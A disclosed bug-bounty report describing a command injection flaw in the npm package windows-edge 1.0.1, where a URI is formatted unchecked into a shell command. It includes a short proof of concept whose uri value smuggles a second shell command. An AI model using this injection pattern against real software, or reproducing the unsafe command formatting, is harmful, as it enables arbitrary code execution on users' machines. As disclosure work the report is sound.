# [windows-edge] RCE via insecure command formatting

## Report Details
- **Report ID**: 878420
- **URL**: https://hackerone.com/reports/878420
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-19T22:34:12.863Z
- **Disclosed**: 2020-08-24T22:04:31.879Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `windows-edge` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `windows-edge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/windows-edge`

## Module Description
> Launch a new Microsoft Edge tab on Windows

## Module Stats
[102] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/eugeneware/windows-edge/blob/master/index.js#L8

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
const edge = require('windows-edge');
edge({ uri: 'https://github.com/; touch HACKED; #' }, (err, ps) => {})

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i windows-edge # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F835199}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: v12.16.1
- [NPM VERSION]: 6.13.4

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `windows-edge`

## Attachments
- Screenshot_from_2020-05-20_00-27-21.png
